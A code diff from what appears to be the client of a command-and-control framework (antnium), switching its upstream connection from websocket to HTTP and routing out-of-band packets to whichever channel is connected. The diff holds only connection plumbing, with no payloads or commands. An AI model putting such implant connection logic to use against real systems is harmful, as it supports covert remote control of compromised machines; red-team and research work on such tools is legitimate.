@@ -6,6 +6,8 @@ import (
 	"github.com/dobin/antnium/pkg/arch"
 	"github.com/dobin/antnium/pkg/campaign"
 	"github.com/dobin/antnium/pkg/model"
+
+	log "github.com/sirupsen/logrus"
 )
 
 /*
@@ -46,43 +48,42 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 
 // Connect will until the C2 can be reached
 func (d *UpstreamManager) Connect() error {
-	// Try: Websocket
-	err := d.UpstreamWs.Connect()
-	if err != nil {
-		return err
-	}
-	d.UpstreamWs.Start()
-	d.sendPing()
-
-	var packet model.Packet
-	go func() {
-		for {
-			packet = <-d.UpstreamWs.Channel()
-			d.Channel <- packet
-
-			packet = <-d.Channel
-			d.UpstreamWs.OobChannel() <- packet
+	/*
+		// Try: Websocket
+		err := d.UpstreamWs.Connect()
+		if err != nil {
+			return err
 		}
-	}()
+		d.UpstreamWs.Start()
+		d.sendPing()
 
-	/**
+		var packet model.Packet
+		go func() {
+			for {
+				packet = <-d.UpstreamWs.Channel()
+				d.Channel <- packet
+
+				packet = <-d.Channel
+				d.UpstreamWs.OobChannel() <- packet
+			}
+		}()*/
+
 	// Try: HTTP
-	err := d.upstreamHttp.Connect()
+	err := d.UpstreamHttp.Connect()
 	if err != nil {
 		return err
 	}
-	d.upstreamHttp.Start()
-	d.sendPing()
+	d.UpstreamHttp.Start()
+	//d.sendPing()
 
 	var packet model.Packet
 	go func() {
-		packet = <-d.upstreamHttp.Channel()
-		d.channel <- packet
+		packet = <-d.UpstreamHttp.Channel()
+		d.Channel <- packet
 
-		packet = <-d.channel
-		d.SendOutofband(packet)
+		packet = <-d.Channel
+		d.UpstreamHttp.OobChannel() <- packet
 	}()
-	**/
 
 	// Wait
 
@@ -90,11 +91,13 @@ func (d *UpstreamManager) Connect() error {
 }
 
 func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
-	/**
-	return d.upstreamHttp.SendOutofband(packet)
-	**/
-
-	d.UpstreamWs.OobChannel() <- packet
+	if d.UpstreamHttp.Connected() {
+		d.UpstreamHttp.OobChannel() <- packet
+	} else if d.UpstreamWs.Connected() {
+		d.UpstreamWs.OobChannel() <- packet
+	} else {
+		log.Warn("OOB: No active upstreams, dont send")
+	}
 
 	return nil
 }
